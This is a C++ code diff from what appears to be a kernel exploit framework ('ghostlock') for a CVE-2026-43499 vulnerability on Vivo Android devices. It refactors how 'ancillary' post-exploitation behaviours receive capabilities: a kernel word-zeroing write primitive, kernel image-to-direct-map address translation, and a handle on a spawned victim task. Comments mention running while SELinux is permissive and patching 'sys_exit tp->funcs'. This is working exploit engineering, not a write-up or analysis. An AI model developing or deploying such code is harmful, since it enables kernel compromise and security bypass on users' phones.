@@ -11,6 +11,7 @@
 
 #include "backend/cve_2026_43499/steps.hpp"
 
+#include "backend/cve_2026_43499/capability_adapters.hpp"
 #include "backend/cve_2026_43499/primitives.hpp"
 #include "backend/cve_2026_43499_state.hpp"
 
@@ -31,7 +32,7 @@
 
 #include "memory/direct_map.hpp"
 #include "memory/target.h"
-#include "ancillary/controller.hpp"
+#include "plugin/controller.hpp"
 #include "platform/vivo/registry.hpp"
 #include "platform/vivo/schema.hpp"
 #include "backend/victim/victim_process.hpp"
@@ -52,14 +53,29 @@ namespace ghostlock::backend {
     using ghostlock::contract::StageResult;
     namespace {
         /* Injected image->direct-map translation for the vendor behaviors.
-         * Like Cve43499Primitives::zero_word it binds the session global, so the
-         * neutral AncillaryOps carries a plain function pointer and
+         * Like Cve43499Primitives::zero_word it binds the session global, so
          * platform::vivo never names a backend type. */
         uintptr_t image_to_direct_map(uintptr_t image_addr) noexcept {
             return ghostlock::backend::cve43499_state(
                        ghostlock::session::g_exploit_session)
                     .addresses.data_alias(image_addr);
         }
+
+        /* Non-owning KernelAlias view over the 43499 session's data_alias. Built
+         * call-block-local by the PreSpawn ancillary block; a zero translation
+         * is an explicit Unavailable, not a 0-as-success (R7). */
+        class SessionKernelAlias final : public contract::KernelAlias {
+        public:
+            [[nodiscard]] contract::CapabilityResult<std::uint64_t>
+            to_direct_map(std::uint64_t image_addr) const noexcept override {
+                const uintptr_t mapped =
+                        image_to_direct_map(static_cast<uintptr_t>(image_addr));
+                if (mapped == 0) {
+                    return std::unexpected(contract::CapabilityError::Unavailable);
+                }
+                return mapped;
+            }
+        };
 
         /* Shared write/retry sequence. */
         template <class M>
@@ -178,20 +194,25 @@ namespace ghostlock::backend {
                 const platform::vivo::View ancillary_view =
                         platform::vivo::make_view(
                             ghostlock::backend::cve43499_state(session).profile);
-                ancillary::AncillaryOps ancillary_ops{
-                    .write_available = true,
-                    .read_available = false,
-                    .write_zero = &Cve43499Primitives::template zero_word<M>,
-                    .image_to_direct_map = &image_to_direct_map,
-                    .child_task = child_task,
+                /* Call-block-local, non-owning capability view (design sections
+                 * 5 and 7(b)): the KernelMemory adapter binds zero_word<M> at
+                 * compile time and the ChildTask adapter reports the freshly
+                 * spawned task (Unavailable when absent). The adapters die with
+                 * this block and are never stored in the session. */
+                cve_2026_43499::Tier1KernelMemory<M> ancillary_kernel{
+                        "vr.ko per-task tag"};
+                cve_2026_43499::StepChildTask ancillary_child{child_task};
+                const contract::Capabilities ancillary_caps{
+                    .kernel = &ancillary_kernel,
+                    .child = &ancillary_child,
                 };
                 const auto ancillary_enabled = [&ancillary_view]<class P>() {
                     return P::enabled(ancillary_view);
                 };
-                if (!ancillary::AncillaryController<
-                            platform::vivo::VivoAncillaryPolicies>::apply<M>(
-                            ancillary::AncillaryStage::PostSpawn, session,
-                            ancillary_ops, ancillary_enabled, ancillary_view)) {
+                if (!plugin::PluginController<
+                            platform::vivo::VivoPluginPolicies>::apply(
+                            plugin::PluginStage::PostSpawn, session,
+                            ancillary_caps, ancillary_enabled, ancillary_view)) {
                     pr_warning("ancillary: post-spawn behavior reported failure; "
                                "continuing\n");
                 }
@@ -400,7 +421,7 @@ namespace ghostlock::backend {
                 support::run_state::complete("w1b");
             }
             /* Ancillary behaviors run outside the exploit path. The caller
-             * injects the registry (platform::vivo::VivoAncillaryPolicies), the
+             * injects the registry (platform::vivo::VivoPluginPolicies), the
              * view and the gate (the profile's vr.ko support), so the neutral
              * controller knows neither backend nor profile. PreSpawn = SELinux is
              * permissive and no victim exists yet, so one write covers everything
@@ -409,19 +430,23 @@ namespace ghostlock::backend {
                 const platform::vivo::View ancillary_view =
                         platform::vivo::make_view(
                             ghostlock::backend::cve43499_state(session).profile);
-                ancillary::AncillaryOps ancillary_ops{
-                    .write_available = true,
-                    .read_available = false,
-                    .write_zero = &Cve43499Primitives::template zero_word<M>,
-                    .image_to_direct_map = &image_to_direct_map,
+                /* Call-block-local, non-owning capability view: the KernelMemory
+                 * adapter binds zero_word<M> at compile time, the KernelAlias
+                 * adapter resolves the image address. Both die with this block. */
+                cve_2026_43499::Tier1KernelMemory<M> ancillary_kernel{
+                        "vr guard: sys_exit tp->funcs"};
+                SessionKernelAlias ancillary_alias{};
+                const contract::Capabilities ancillary_caps{
+                    .kernel = &ancillary_kernel,
+                    .alias = &ancillary_alias,
                 };
                 const auto ancillary_enabled = [&ancillary_view]<class P>() {
                     return P::enabled(ancillary_view);
                 };
-                if (!ancillary::AncillaryController<
-                            platform::vivo::VivoAncillaryPolicies>::apply<M>(
-                            ancillary::AncillaryStage::PreSpawn, session,
-                            ancillary_ops, ancillary_enabled, ancillary_view)) {
+                if (!plugin::PluginController<
+                            platform::vivo::VivoPluginPolicies>::apply(
+                            plugin::PluginStage::PreSpawn, session,
+                            ancillary_caps, ancillary_enabled, ancillary_view)) {
                     pr_warning("ancillary: pre-spawn behavior reported failure; "
                                "continuing\n");
                 }
